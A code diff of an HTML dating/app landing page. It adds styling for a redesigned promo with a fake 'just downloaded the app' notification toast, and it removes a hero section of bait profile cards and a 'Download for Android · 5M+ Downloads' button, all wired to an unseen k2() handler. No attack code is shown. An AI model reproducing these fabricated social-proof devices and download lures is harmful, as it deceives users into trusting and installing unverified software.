+  border:2.5px solid var(--bg);margin-left:-11px;box-shadow:var(--shadow-sm);
+}
+.avatar-stack img:first-child{margin-left:0}
+.avatar-stack .faces-txt{font-size:.84rem;font-weight:500;color:var(--ink-2)}
+.avatar-stack .faces-txt strong{color:var(--ink);font-weight:700}
+
+/* hero collage */
+.hero-collage{position:relative;min-height:480px;display:flex;align-items:center;justify-content:center}
+.phone{
+  position:relative;width:min(272px,64vw);aspect-ratio:9/19;
+  border-radius:38px;overflow:hidden;
+  background:var(--surface);
+  border:7px solid #241d15;
+  box-shadow:var(--shadow-lg);
+  z-index:3;
+}
+.phone::before{
+  content:'';position:absolute;top:10px;left:50%;transform:translateX(-50%);
+  width:88px;height:22px;border-radius:12px;background:#241d15;z-index:4;
+}
+.phone img{width:100%;height:100%;object-fit:cover}
+.phone-2{
+  position:absolute;left:-34px;bottom:-26px;width:min(200px,46vw);
+  border-width:6px;border-radius:32px;z-index:2;transform:rotate(-8deg);
+}
+.phone-2::before{width:64px;height:18px;top:8px}
+.poster-float{
+  position:absolute;border-radius:14px;overflow:hidden;
+  box-shadow:var(--shadow-lg);z-index:4;
+  border:3px solid var(--surface);
+}
+.poster-float img{width:100%;height:100%;object-fit:cover;display:block}
+.pf-1{top:-18px;right:6%;width:110px;aspect-ratio:2/3;transform:rotate(7deg)}
+.pf-2{bottom:-10px;right:-6px;width:96px;aspect-ratio:2/3;transform:rotate(-5deg);z-index:1}
+.float-chip{
+  position:absolute;z-index:5;display:flex;align-items:center;gap:8px;
+  padding:10px 16px;border-radius:var(--radius-full);
+  background:var(--surface);border:1px solid var(--hairline);
+  box-shadow:var(--shadow-md);font-size:.82rem;font-weight:600;color:var(--ink);
+}
+.float-chip .star{color:var(--star)}
+.fc-rating{top:16%;left:-22px;transform:rotate(-4deg)}
+.fc-downloads{bottom:14%;left:-16px;transform:rotate(3deg)}
+
+/* ============================================================
+   STAT BAND
+   ============================================================ */
+.stat-band{
+  border-top:1px solid var(--hairline);
+  border-bottom:1px solid var(--hairline);
+  background:var(--surface);
+}
+.stat-band-inner{
+  display:grid;grid-template-columns:repeat(4,1fr);
+}
+.stat-band .cell{
+  padding:28px clamp(16px,2vw,32px);
+  border-left:1px solid var(--hairline);
+}
+.stat-band .cell:first-child{border-left:none}
+.stat-band .num{
+  font-family:var(--font-display);font-weight:700;
+  font-size:clamp(1.7rem,2.6vw,2.4rem);letter-spacing:-.02em;color:var(--accent);
+  font-variant-numeric:tabular-nums;line-height:1;
+}
+.stat-band .lbl{
+  margin-top:8px;font-size:.82rem;font-weight:500;color:var(--ink-3);
+  letter-spacing:.01em;
+}
+
+/* ============================================================
+   SECTION BASE
+   ============================================================ */
+.section{padding:clamp(56px,9vw,104px) 0}
+.section-head{margin-bottom:clamp(28px,4vw,44px)}
+.section-head .kicker{
+  font-family:var(--font-sans);font-size:.78rem;font-weight:700;
+  letter-spacing:.16em;text-transform:uppercase;color:var(--accent);
+  margin-bottom:12px;display:flex;align-items:center;gap:10px;
+}
+.section-head .kicker::before{content:'';width:26px;height:2px;background:var(--accent);border-radius:2px}
+.section-head h2{
+  font-family:var(--font-display);font-weight:700;
+  font-size:clamp(1.9rem,3.6vw,3rem);line-height:1.08;letter-spacing:-.02em;
+  text-wrap:balance;
+}
+.section-head h2 em{font-style:italic;color:var(--accent)}
+.section-head .sub{margin-top:14px;font-size:1rem;color:var(--ink-2);max-width:52ch;text-wrap:pretty}
+
+/* ============================================================
+   TRENDING SHELF
+   ============================================================ */
+.shelf{display:grid;grid-template-columns:repeat(5,1fr);gap:18px}
+.poster{
+  position:relative;border-radius:var(--radius);overflow:hidden;
+  aspect-ratio:2/3;background:var(--surface-2);
+  cursor:pointer;box-shadow:var(--shadow-sm);
+  transition:transform .3s var(--ease),box-shadow .3s var(--ease);
+}
+.poster:hover{transform:translateY(-8px) rotate(-1deg);box-shadow:var(--shadow-lg)}
+.poster:active{transform:translateY(-2px) scale(.98)}
+.poster img{width:100%;height:100%;object-fit:cover}
+.poster::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(180deg,rgba(20,14,8,0) 40%,rgba(20,14,8,.82) 100%);
+  pointer-events:none;
+}
+.poster-rank{
+  position:absolute;top:10px;left:12px;z-index:2;
+  font-family:var(--font-display);font-weight:900;font-size:1.7rem;
+  color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.5);line-height:1;
+  -webkit-text-stroke:1px rgba(0,0,0,.15);
+}
+.poster-badge{
+  position:absolute;top:12px;right:12px;z-index:2;
+  padding:4px 11px;border-radius:var(--radius-full);
+  background:var(--accent);color:#fff;font-size:.66rem;font-weight:700;
+  letter-spacing:.04em;text-transform:uppercase;
+}
+.poster-info{position:absolute;bottom:0;left:0;right:0;z-index:2;padding:14px}
+.poster-title{font-size:.9rem;font-weight:700;color:#fff;line-height:1.25}
+.poster-meta{font-size:.72rem;font-weight:500;color:rgba(255,255,255,.72);margin-top:4px;display:flex;align-items:center;gap:5px}
+.poster-meta .star{color:var(--star)}
+
+/* marquee */
+.marquee{overflow:hidden;position:relative;margin-top:56px}
+.marquee::before,.marquee::after{
+  content:'';position:absolute;top:0;bottom:0;width:80px;z-index:2;pointer-events:none;
+}
+.marquee::before{left:0;background:linear-gradient(90deg,var(--bg),transparent)}
+.marquee::after{right:0;background:linear-gradient(-90deg,var(--bg),transparent)}
+.marquee-track{display:inline-flex;gap:14px;animation:marquee 32s linear infinite;width:max-content}
+@keyframes marquee{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+.marquee-card{
+  position:relative;width:150px;aspect-ratio:2/3;border-radius:var(--radius);
+  overflow:hidden;flex-shrink:0;box-shadow:var(--shadow-sm);cursor:pointer;
+}
+.marquee-card img{width:100%;height:100%;object-fit:cover}
+.marquee-card::after{content:'';position:absolute;inset:0;background:linear-gradient(0deg,rgba(20,14,8,.82) 0%,transparent 55%)}
+.marquee-tag{
+  position:absolute;top:10px;left:10px;z-index:2;padding:3px 10px;border-radius:6px;
+  background:rgba(20,14,8,.6);backdrop-filter:blur(4px);color:#fff;
+  font-size:.6rem;font-weight:700;letter-spacing:.05em;text-transform:uppercase;
+}
+.marquee-title{position:absolute;bottom:12px;left:12px;right:12px;z-index:2;font-size:.74rem;font-weight:600;color:#fff;line-height:1.3}
+.marquee:hover .marquee-track{animation-play-state:paused}
+
+/* ============================================================
+   FEATURES — bento grid
+   ============================================================ */
+.bento{display:grid;grid-template-columns:repeat(12,1fr);gap:16px}
+.feature{
+  border-radius:var(--radius-lg);background:var(--surface);
+  border:1px solid var(--hairline);padding:clamp(24px,3vw,34px);
+  transition:transform .3s var(--ease),box-shadow .3s var(--ease),border-color .3s;
+  position:relative;overflow:hidden;
+}
+.feature:hover{transform:translateY(-4px);box-shadow:var(--shadow-md);border-color:var(--hairline-strong)}
+.feature .icon{
+  width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;
+  background:var(--accent-soft);color:var(--accent);margin-bottom:18px;
+}
+.feature .icon svg{width:23px;height:23px}
+.feature h3{font-family:var(--font-display);font-weight:700;font-size:1.28rem;letter-spacing:-.01em;margin-bottom:8px}
+.feature p{font-size:.92rem;color:var(--ink-2);line-height:1.6}
+.feature .num-tag{
+  position:absolute;top:18px;right:20px;font-family:var(--font-display);
+  font-weight:900;font-size:2.6rem;line-height:1;color:var(--hairline);
+}
+.f-lg{grid-column:span 7}
+.f-sm{grid-column:span 5}
+.f-full{grid-column:span 12}
+
+.feature-media{grid-column:span 12;position:relative;border-radius:var(--radius-lg);overflow:hidden;background:#211a12}
+.feature-media img{width:100%;height:100%;object-fit:cover;opacity:.9}
+.feature-media .overlay{
+  position:absolute;inset:0;display:flex;flex-direction:column;justify-content:flex-end;
+  padding:clamp(26px,4vw,44px);
+  background:linear-gradient(180deg,rgba(24,17,10,0) 20%,rgba(24,17,10,.9) 100%);
+}
+.feature-media .overlay h3{font-family:var(--font-display);font-weight:700;font-size:clamp(1.4rem,2.4vw,2rem);color:#fff;margin-bottom:18px}
+.feature-media .overlay ul{display:grid;grid-template-columns:1fr 1fr;gap:14px;max-width:720px}
+.feature-media .overlay li{display:flex;align-items:flex-start;gap:11px;font-size:.92rem;color:rgba(255,255,255,.85);line-height:1.5}
+.feature-media .overlay li strong{color:#fff}
+.feature-media .overlay li .dot{width:6px;height:6px;min-width:6px;border-radius:50%;background:var(--accent);margin-top:7px}
+
+/* ============================================================
+   REVIEWS — masonry
+   ============================================================ */
+.reviews{columns:2;column-gap:18px}
+.review{
+  break-inside:avoid;margin-bottom:18px;border-radius:var(--radius-lg);
+  background:var(--surface);border:1px solid var(--hairline);
+  padding:26px;box-shadow:var(--shadow-sm);
+  transition:transform .3s var(--ease),box-shadow .3s;
+}
+.review:hover{transform:translateY(-3px);box-shadow:var(--shadow-md)}
+.review .stars{display:flex;gap:2px;margin-bottom:14px}
+.review .stars svg{width:15px;height:15px;color:var(--star)}
+.review p{font-size:.94rem;color:var(--ink-2);line-height:1.66;font-style:italic;margin-bottom:18px}
+.review .who{display:flex;align-items:center;gap:11px}
+.review .who img{width:40px;height:40px;border-radius:12px;object-fit:cover}
+.review .who .name{font-size:.88rem;font-weight:700;color:var(--ink)}
+.review .who .tag{font-size:.74rem;color:var(--ink-3)}
+
+/* ============================================================
+   BIG STATS
+   ============================================================ */
+.big-stats{background:var(--ink);border-radius:var(--radius-xl);color:#FFF8F3;overflow:hidden;position:relative}
+.big-stats::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(50% 60% at 90% 0%,rgba(198,64,42,.28),transparent 60%),
+    radial-gradient(40% 50% at 0% 100%,rgba(201,138,27,.16),transparent 60%);
+}
+.big-stats-inner{position:relative;display:grid;grid-template-columns:repeat(4,1fr)}
+.big-stats .cell{padding:clamp(30px,4vw,52px);border-left:1px solid rgba(255,255,255,.1)}
+.big-stats .cell:first-child{border-left:none}
+.big-stats .num{font-family:var(--font-display);font-weight:700;font-size:clamp(2rem,3.6vw,3rem);line-height:1;letter-spacing:-.02em;color:#fff}
+.big-stats .lbl{margin-top:10px;font-size:.82rem;font-weight:500;color:rgba(255,255,255,.55);letter-spacing:.02em}
+
+/* ============================================================
+   SECURITY
+   ============================================================ */
+.sec-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.sec-card{
+  border-radius:var(--radius-lg);background:var(--surface);
+  border:1px solid var(--hairline);padding:26px;
+  transition:transform .3s var(--ease),box-shadow .3s,border-color .3s;
+}
+.sec-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-md);border-color:var(--hairline-strong)}
+.sec-card .icon{width:44px;height:44px;border-radius:12px;background:var(--accent-soft);color:var(--accent);display:flex;align-items:center;justify-content:center;margin-bottom:16px}
+.sec-card .icon svg{width:21px;height:21px}
+.sec-card h3{font-size:1.02rem;font-weight:700;margin-bottom:5px}
+.sec-card p{font-size:.84rem;color:var(--ink-3);line-height:1.5}
+
+/* ============================================================
+   DOWNLOAD CTA — full-bleed ink finale
+   ============================================================ */
+.download{
+  position:relative;background:var(--ink);color:#FFF8F3;
+  padding:clamp(72px,10vw,120px) 0;overflow:hidden;text-align:center;
+}
+.download::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(55% 70% at 50% -10%,rgba(198,64,42,.32),transparent 60%),
+    var(--noise);background-size:auto,160px 160px;opacity:1;
+}
+.download-inner{position:relative;max-width:680px;margin:0 auto}
+.download .kicker{
+  display:inline-flex;align-items:center;gap:7px;padding:7px 15px;border-radius:var(--radius-full);
+  background:rgba(198,64,42,.16);border:1px solid rgba(198,64,42,.32);
+  color:#F3A08F;font-size:.78rem;font-weight:600;margin-bottom:22px;
+}
+.download .kicker svg{width:14px;height:14px}
+.download h2{font-family:var(--font-display);font-weight:700;font-size:clamp(2.2rem,4.6vw,3.6rem);line-height:1.04;letter-spacing:-.02em;margin-bottom:16px;text-wrap:balance}
+.download h2 em{font-style:italic;color:#F3A08F}
+.download p{font-size:1.02rem;color:rgba(255,255,255,.62);line-height:1.65;max-width:54ch;margin:0 auto 30px}
+.download .btn-primary{font-size:1.06rem;padding:17px 36px}
+.download .note{margin-top:18px;font-size:.8rem;color:rgba(255,255,255,.4)}
+
+/* ============================================================
+   FAQ
+   ============================================================ */
+.faq-wrap{max-width:760px;margin:0 auto}
+.faq-entry{border-bottom:1px solid var(--hairline)}
+.faq-entry:first-child{border-top:1px solid var(--hairline)}
+.faq-q{
+  display:flex;align-items:center;justify-content:space-between;gap:16px;
+  width:100%;text-align:left;padding:22px 0;font-size:1.02rem;font-weight:600;color:var(--ink);
+  transition:color .2s;
+}
+.faq-q:hover{color:var(--accent)}
+.faq-indicator{
+  width:30px;height:30px;min-width:30px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  background:var(--surface-2);color:var(--ink-2);
+  transition:transform .35s var(--ease),background .3s,color .3s;
+}
+.faq-indicator svg{width:15px;height:15px}
+.faq-entry.open .faq-q{color:var(--accent)}
+.faq-entry.open .faq-indicator{transform:rotate(45deg);background:var(--accent);color:#fff}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .45s var(--ease)}
+.faq-entry.open .faq-a{max-height:420px}
+.faq-a-inner{padding:0 0 24px;font-size:.94rem;color:var(--ink-2);line-height:1.7;max-width:62ch}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.page-footer{border-top:1px solid var(--hairline);padding:34px 0}
+.footer-inner{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.footer-brand{display:flex;align-items:center;gap:10px;font-size:.86rem;color:var(--ink-3)}
+.footer-brand img{width:26px;height:26px;border-radius:8px;object-fit:cover}
+.footer-links{display:flex;align-items:center;gap:22px}
+.footer-links a{font-size:.86rem;font-weight:500;color:var(--ink-2);transition:color .2s}
+.footer-links a:hover{color:var(--accent)}
+
+/* ============================================================
+   FLOAT BAR + TOAST
+   ============================================================ */
+.float-bar{
+  position:fixed;bottom:0;left:0;right:0;z-index:120;
+  padding:12px 16px max(12px,env(safe-area-inset-bottom));
+  background:rgba(255,253,248,.9);
+  backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
+  border-top:1px solid var(--hairline);box-shadow:0 -8px 30px rgba(64,48,28,.08);
+  transform:translateY(100%);transition:transform .35s var(--ease);
+  pointer-events:none;
+}
+.float-bar.on{transform:translateY(0);pointer-events:auto}
+.float-bar-inner{max-width:var(--container);margin:0 auto;display:flex;align-items:center;gap:14px}
+.float-bar-logo{width:38px;height:38px;border-radius:11px;object-fit:cover;box-shadow:var(--shadow-sm)}
+.float-bar-info{flex:1;min-width:0}
+.float-bar-info .t{font-size:.9rem;font-weight:700}
+.float-bar-info .s{font-size:.76rem;color:var(--ink-3)}
+.float-bar .btn-primary{padding:12px 24px;font-size:.9rem}
+
+.social-toast{
+  position:fixed;bottom:96px;right:18px;z-index:130;
+  display:flex;align-items:center;gap:11px;
+  padding:13px 16px;border-radius:var(--radius-lg);
+  background:var(--surface);border:1px solid var(--hairline-strong);
+  box-shadow:var(--shadow-lg);
+  transform:translateX(calc(100% + 40px));transition:transform .5s var(--ease-spring);
+  pointer-events:none;max-width:300px;
+}
+.social-toast.show{transform:translateX(0)}
+.social-toast.hide{transform:translateX(calc(100% + 40px))}
+.social-toast .avatar{
+  width:38px;height:38px;border-radius:12px;object-fit:cover;flex-shrink:0;
+}
+.social-toast .msg{font-size:.8rem;font-weight:600;line-height:1.35}
+.social-toast .time{font-size:.68rem;color:var(--ink-3);margin-top:1px}
+.social-toast .close{
+  width:22px;height:22px;min-width:22px;border-radius:50%;
+  background:var(--surface-2);display:flex;align-items:center;justify-content:center;
+  color:var(--ink-3);font-size:.62rem;cursor:pointer;pointer-events:auto;
+}
+
+/* ============================================================
+   REVEAL
+   ============================================================ */
+.reveal{opacity:0;transform:translateY(28px);transition:opacity .7s var(--ease),transform .7s var(--ease)}
+.reveal.visible{opacity:1;transform:translateY(0)}
+.reveal.d1{transition-delay:.08s}
+.reveal.d2{transition-delay:.16s}
+.reveal.d3{transition-delay:.24s}
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media(max-width:920px){
+  .nav-links{display:none}
+  .hero-grid{grid-template-columns:1fr}
+  .hero-collage{min-height:0;margin-top:12px}
+  .phone{width:min(240px,58vw)}
+  .shelf{grid-template-columns:repeat(3,1fr)}
+  .bento{grid-template-columns:1fr 1fr}
+  .f-lg,.f-sm{grid-column:span 2}
+  .feature-media{grid-column:span 2}
+  .feature-media .overlay ul{grid-template-columns:1fr}
+  .reviews{columns:1}
+  .sec-grid{grid-template-columns:1fr 1fr}
+  .big-stats-inner{grid-template-columns:1fr 1fr}
+  .big-stats .cell:nth-child(3){border-left:none}
+  .big-stats .cell{border-top:1px solid rgba(255,255,255,.1)}
+  .big-stats .cell:nth-child(-n+2){border-top:none}
+  .stat-band-inner{grid-template-columns:1fr 1fr}
+  .stat-band .cell{border-top:1px solid var(--hairline)}
+  .stat-band .cell:nth-child(-n+2){border-top:none}
+  .stat-band .cell:nth-child(odd){border-left:none}
+}
+@media(max-width:560px){
+  .shelf{grid-template-columns:1fr 1fr;gap:12px}
+  .bento{grid-template-columns:1fr}
+  .f-lg,.f-sm,.feature-media{grid-column:span 1}
+  .sec-grid{grid-template-columns:1fr}
+  .hero-actions .btn{width:100%}
+  .poster-float{display:none}
+  .float-chip{display:none}
+  .phone-2{display:none}
+}
+
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important;scroll-behavior:auto!important}
+}
+</style>
 </head>
 <body>
-<!-- ===== Top Hero Section ===== -->
-<section class="hero-top">
-  <div class="hero-top-glow"></div>
-  <div class="hero-top-inner">
-    <div class="hero-top-badge"><span class="ping-dot"></span>Private &amp; Secret</div>
-    <h1>The Night Calls,<br><span class="gt">Connect Without Limits</span></h1>
-    <p class="hero-top-desc">Real profiles. Authentic connections. Chat, flirt, and meet someone special near you tonight.</p>
-    <div class="hero-top-users">
-      <div class="hero-top-avatars">
-        <img src="img/a/c1.jpg" alt="User" onclick="k2()">
-        <img src="img/a/c2.jpg" alt="User" onclick="k2()">
-        <img src="img/a/c3.jpg" alt="User" onclick="k2()">
-        <img src="img/a/c4.jpg" alt="User" onclick="k2()">
-        <div class="plus-avatar">+</div>
-      </div>
-      <span class="hero-top-users-text">Join <strong>5,000,000+</strong> people</span>
-    </div>
+<div class="grain" aria-hidden="true"></div>
+
+<!-- ============================================================
+     SOCIAL TOAST
+     ============================================================ -->
+<div class="social-toast" id="socialToast">
+  <img class="avatar" id="toastAvatar" src="img/a/c1.jpg" alt="">
+  <div style="min-width:0">
+    <div class="msg" id="toastMsg">acaba de descargar la app</div>
+    <div class="time" id="toastTime">Hace 1 min</div>
   </div>
-  <div class="hero-phone-wrap">
-    <div class="hero-phone-glow"></div>
- 
-    <div class="hero-phone">
-      <div class="hero-phone-notch"><span class="bar"></span><span class="dot"></span></div>
-      <div class="hero-phone-screen">
-        <div class="hero-phone-topbar"><span>🌙 Nearby Dates</span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.5)" stroke-width="2"><line x1="4" y1="21" x2="4" y2="14"/><line x1="4" y1="10" x2="4" y2="3"/><line x1="12" y1="21" x2="12" y2="12"/><line x1="12" y1="8" x2="12" y2="3"/><line x1="20" y1="21" x2="20" y2="16"/><line x1="20" y1="12" x2="20" y2="3"/><circle cx="4" cy="12" r="1.5" fill="rgba(255,255,255,0.5)"/><circle cx="12" cy="10" r="1.5" fill="rgba(255,255,255,0.5)"/><circle cx="20" cy="14" r="1.5" fill="rgba(255,255,255,0.5)"/></svg></div>
-        <div class="hero-phone-cards">
-          <div class="hero-phone-card-shadow"></div>
-          <div class="hero-phone-card" onclick="k2()">
-            <div class="hero-phone-card-img">
-              <img src="img/15-1.jpg" alt="User Card">
-              <div class="hero-phone-card-info">
-                <div class="uname">Sofía, 23 <svg width="10" height="10" viewBox="0 0 24 24" fill="#4da6ff" stroke="none"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4" stroke="#fff" stroke-width="2.5" fill="none"/></svg></div>
-                <div class="uloc"><svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="#ff4b6e" stroke-width="2.5"><circle cx="12" cy="10" r="3"/><path d="M12 2a8 8 0 00-8 8c0 5.5 8 13 8 13s8-7.5 8-13a8 8 0 00-8-8z"/></svg> 2.5 km away · Online now</div>
-              </div>
-            </div>
-            <div class="hero-phone-actions">
-              <button class="btn-no" onclick="event.stopPropagation();k2()"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
-              <button class="btn-yes" onclick="event.stopPropagation();k2()"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path d="M9 12l2 2 4-4"/></svg></button>
-              <button class="btn-star" onclick="event.stopPropagation();k2()"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></button>
-            </div>
-          </div>
-        </div>
-        <div class="hero-phone-tabs">
-          <span class="on"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></span>
-          <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="16.5" y1="16.5" x2="22" y2="22"/></svg></span>
-          <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg><span class="tab-badge">3</span></span>
-          <span><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M20 21v-2a4 4 0 00-6-3.5"/></svg></span>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-<!-- ===== /Top Hero Section ===== -->
-
-<!--
-<button class="chat-fab" onclick="k2()" aria-label="Contact Support"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg><span class="chat-badge">1</span></button>
--->
-<section class="hero">
-  <div class="online-indicator"><span class="online-dot"></span>Singles connected right now</div>
-  <div class="hero-badge"><span class="live-dot"></span>LIVE · Casual Dating</div>
-  <div class="float-avatars"><img src="img/18-1.jpg" alt=""><img src="img/17-1.jpg" alt=""><img src="img/16-1.jpg" alt=""><img src="img/15-1.jpg" alt=""><img src="img/14-1.jpg" alt=""></div>
-  <h1>Find Your<span class="gt"> Perfect Match</span></h1>
-  <p class="hero-sub">Meet local singles ready to chat, connect, and meet tonight. Real profiles, real connections.</p>
- <a href="javascript:void(0)" class="dl-btn" onclick="k2()">Download for Android<small>4.8 Stars · 5M+ Downloads · Free</small></a>
-  <div class="stats-row"><div><div class="stat-num">100%</div><div class="stat-label">Free to Join</div></div><div><div class="stat-num">24/7</div><div class="stat-label">Real Members</div></div><div><div class="stat-num">Instant</div><div class="stat-label">Connections</div></div></div>
-</section>
-
-<!-- 
-<section class="sec" style="padding-bottom:0.5rem">
-  <div class="sec-tag" style="text-align:center;font-size:0.65rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:#ff6b81;margin-bottom:4px">🔥 Most Viewed Now</div>
-  <h2 class="sec-title" style="margin-bottom:2px">Who's Hot Tonight</h2>
-  <p class="sec-sub" style="margin-bottom:10px"><span style="color:#32c896">People</span> browsing now</p>
-  <div class="hot-scroll" id="hotScroll">
-    <div class="hot-card"><div class="hot-img"><img src="img/1-1.jpg"><span class="hot-badge popular">Popular</span><span class="hot-views">👁 12.4K</span></div><div class="hot-info"><div class="hot-name">Ada, 20</div></div></div>
-    <div class="hot-card"><div class="hot-img"><img src="img/2-1.jpg"><span class="hot-badge new">New</span><span class="hot-views">👁 8.2K</span></div><div class="hot-info"><div class="hot-name">Darlene, 22</div></div></div>
-    <div class="hot-card"><div class="hot-img"><img src="img/3-1.jpg"><span class="hot-badge verified">Verified</span><span class="hot-views">👁 15.7K</span></div><div class="hot-info"><div class="hot-name">Alma, 25</div></div></div>
-    <div class="hot-card"><div class="hot-img"><img src="img/4-1.jpg"><span class="hot-badge popular">Popular</span><span class="hot-views">👁 20.1K</span></div><div class="hot-info"><div class="hot-name">Bonnie, 26</div></div></div>
-    <div class="hot-card"><div class="hot-img"><img src="img/5-1.jpg"><span class="hot-badge new">New</span><span class="hot-views">👁 9.8K</span></div><div class="hot-info"><div class="hot-name">Dora, 24</div></div></div>
-    <div class="hot-card"><div class="hot-img"><img src="img/6-1.jpg"><span class="hot-badge vip">VIP</span><span class="hot-views">👁 18.3K</span></div><div class="hot-info"><div class="hot-name">Camille, 24</div></div></div>
-  </div>
-  <div class="hot-dots" id="hotDots"><span class="hot-dot on"></span><span class="hot-dot"></span><span class="hot-dot"></span><span class="hot-dot"></span><span class="hot-dot"></span><span class="hot-dot"></span></div>
-</section>
--->
-<section class="sec">
-  <h2 class="sec-title">Meet Them Tonight</h2>
-  <p class="sec-sub">Swipe through their photos. They're ready to meet you.</p>
-  <div class="user-grid" id="userGrid">
-
-    <div class="user-card"><img src="img/1-1.jpg"><span class="badge badge-online">Online</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch Video</button><div class="info"><div class="name">Ada<span class="age">20</span></div><div class="job">Makeup Artist</div><div class="body-stats"><span>173cm</span><span>116lbs</span></div><div class="loc">Lagos</div></div></div>
-
-    <div class="user-card"><img src="img/2-1.jpg"><span class="badge badge-hot">Popular</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch Video</button><div class="info"><div class="name">Darlene<span class="age">22</span></div><div class="job">Student</div><div class="body-stats"><span>176cm</span><span>109lbs</span></div><div class="loc">Abuja</div></div></div>
-
-    <div class="user-card"><img src="img/3-1.jpg"><span class="badge badge-new">New</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch Video</button><div class="info"><div class="name">Alma<span class="age">25</span></div><div class="job">Student</div><div class="body-stats"><span>165cm</span><span>112lbs</span></div><div class="loc">Port Harcourt</div></div></div>
-
-    <div class="user-card"><img src="img/4-1.jpg"><span class="badge badge-online">Online</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch Video</button><div class="info"><div class="name">Bonnie<span class="age">26</span></div><div class="job">Fitness Trainer</div><div class="body-stats"><span>168cm</span><span>116lbs</span></div><div class="loc">Kano</div></div></div>
-
-    <div class="user-card"><img src="img/5-1.jpg"><span class="badge badge-hot">Popular</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch Video</button><div class="info"><div class="name">Dora<span class="age">24</span></div><div class="job">Doctor</div><div class="body-stats"><span>165cm</span><span>104lbs</span></div><div class="loc">Ibadan</div></div></div>
-
-    <div class="user-card"><img src="img/6-1.jpg"><span class="badge badge-online">Online</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch Video</button><div class="info"><div class="name">Camille<span class="age">24</span></div><div class="job">Doctor</div><div class="body-stats"><span>165cm</span><span>104lbs</span></div><div class="loc">Enugu</div></div></div>
-
-    <div class="user-card"><img src="img/7-1.jpg"><span class="badge badge-new">New</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch Video</button><div class="info"><div class="name">Cara<span class="age">26</span></div><div class="job">Photographer</div><div class="body-stats"><span>168cm</span><span>113lbs</span></div><div class="loc">Benin City</div></div></div>
-
-    <div class="user-card"><img src="img/8-1.jpg"><span class="badge badge-online">Online</span><button class="card-contact" onclick="event.stopPropagation();k2(event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 4 20 12 6 20 6 4"/></svg>Watch Video</button><div class="info"><div class="name">Debby<span class="age">21</span></div><div class="job">Student</div><div class="body-stats"><span>168cm</span><span>108lbs</span></div><div class="loc">Owerri</div></div></div>
